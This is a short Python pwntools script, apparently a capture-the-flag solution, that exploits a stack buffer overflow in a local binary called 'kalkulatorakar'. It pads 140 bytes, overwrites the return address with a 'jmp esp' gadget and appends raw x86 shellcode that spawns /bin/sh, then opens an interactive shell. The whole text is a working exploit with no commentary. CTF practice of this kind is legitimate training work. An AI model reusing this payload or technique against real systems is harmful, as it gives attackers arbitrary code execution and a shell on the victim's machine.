from pwn import *

binary = "./kalkulatorakar"
elf = context.binary = ELF(binary)
p = process(binary)	

## Gadgets
#0x0804923c : jmp esp

esp = p32(0x0804923c)
payload = b"A"*140
payload += esp
payload += b"\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"


p.recv()
p.sendline(payload)
p.interactive()